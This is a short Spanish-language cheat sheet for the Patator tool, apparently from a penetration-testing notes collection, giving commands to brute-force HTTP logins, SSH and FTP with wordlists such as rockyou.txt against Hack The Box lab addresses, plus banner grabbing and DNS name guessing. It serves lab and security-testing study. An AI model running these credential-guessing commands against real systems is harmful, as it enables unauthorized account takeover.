# Patator Cheat Sheet

#### Fuerza Bruta a HTTP
```
patator http_fuzz url="http//10.10.10.43/deparment/login.php" method=POST body='username=admin&password=FILE0' 0=/usr/share/wordlist/rockyou.txt follow=1 accept_cookie=1 -x ignore:fgrep="Invalid Password\!"
```

#### Fuerza Bruta a SSH
```
patator ssh_login host=10.10.10.76 port=22022 user=FILE0 0=/root/Documentos/HTB/Sunday/usuarios.txt password=FILE1 1=/root/SecList/Passwords/probable-v2-top1575.txt -x ignore:fgrep='failed'
```

#### Fuerza Bruta a FTP
```
patator ftp_login host=192.168.2.6 user=FILE0 0=/usr/share/wordlists/rockyou.txt password=FILE1 1=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='incorrect' -x ignore,reset,retry:code=500
```

#### Banner Grabbing
```
patator tcp_fuzz host=<Target> port=<port>
```

#### Consulta de Servidores DNS
```
patator dns_forward name=FILE0.domain.com 0=lista.txt -x ignore:code=3
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)